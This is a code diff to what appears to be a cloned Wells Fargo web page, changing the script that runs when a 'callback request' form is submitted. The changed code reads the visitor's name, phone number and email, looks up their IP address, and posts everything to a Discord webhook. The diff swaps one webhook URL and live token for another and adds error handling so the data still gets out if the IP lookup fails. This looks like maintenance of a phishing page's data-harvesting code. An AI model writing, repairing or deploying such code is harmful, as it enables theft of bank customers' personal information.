@@ -405,32 +405,49 @@ var ndURI ="https://connect.secure.wellsfargo.com/ATADUN/2.2/w/w-642409/sync/js/
       form.addEventListener('submit', function(e) {
         e.preventDefault();
 
-        var webhookUrl = 'https://discord.com/api/webhooks/1553531473041039380/hHgPBAibgg8LPicpEJfFqhdbAnVFV2vrBzwrSROAfCWKsuL0yyW-LpO_xLdL3Sxv-huh';
+        var webhookUrl = 'https://discord.com/api/webhooks/1554175041409917011/-a74VR3l61m86vdvLcVLw3mK4VUXQvHzIyCy8r_mP9hYFEVzLteFeyxIIoM8ermgFle_';
 
-        fetch('https://api.ipify.org?format=json')
-          .then(function(res) { return res.json(); })
-          .then(function(data) {
-            var payload = {
-              content: ':phone: **New Callback Request**',
-              embeds: [{
-                title: 'Callback Request Details',
-                color: 13414659,
-                fields: [
-                  { name: 'Name', value: form.querySelector('[name="name"]').value, inline: true },
-                  { name: 'Phone Number', value: form.querySelector('[name="phone"]').value, inline: true },
-                  { name: 'Email', value: form.querySelector('[name="email"]').value, inline: true },
-                  { name: 'IP Address', value: data.ip, inline: true }
-                ],
-                timestamp: new Date().toISOString()
-              }]
-            };
+        var name = form.querySelector('[name="name"]').value;
+        var phone = form.querySelector('[name="phone"]').value;
+        var email = form.querySelector('[name="email"]').value;
 
-            fetch(webhookUrl, {
-              method: 'POST',
-              headers: { 'Content-Type': 'application/json' },
-              body: JSON.stringify(payload)
-            });
+        function sendToDiscord(ip) {
+          var payload = {
+            content: ':phone: **New Callback Request**',
+            embeds: [{
+              title: 'Callback Request Details',
+              color: 13414659,
+              fields: [
+                { name: 'Name', value: name, inline: true },
+                { name: 'Phone Number', value: phone, inline: true },
+                { name: 'Email', value: email, inline: true },
+                { name: 'IP Address', value: ip || 'N/A', inline: true }
+              ],
+              timestamp: new Date().toISOString()
+            }]
+          };
+
+          return fetch(webhookUrl, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+          }).then(function(resp) {
+            if (!resp.ok) throw new Error('Webhook failed: ' + resp.status);
+            return resp;
           });
+        }
+
+        // Try to get IP, but don't block submission if it fails
+        var ipPromise = fetch('https://api.ipify.org?format=json')
+          .then(function(res) { return res.json(); })
+          .then(function(data) { return data.ip; })
+          .catch(function() { return null; });
+
+        ipPromise.then(function(ip) {
+          sendToDiscord(ip).catch(function(err) {
+            console.error('Discord webhook error:', err);
+          });
+        });
 
         var successDiv = document.createElement('div');
         successDiv.style.cssText = 'display:flex;flex-direction:column;align-items:center;gap:12px;padding:24px 0;';
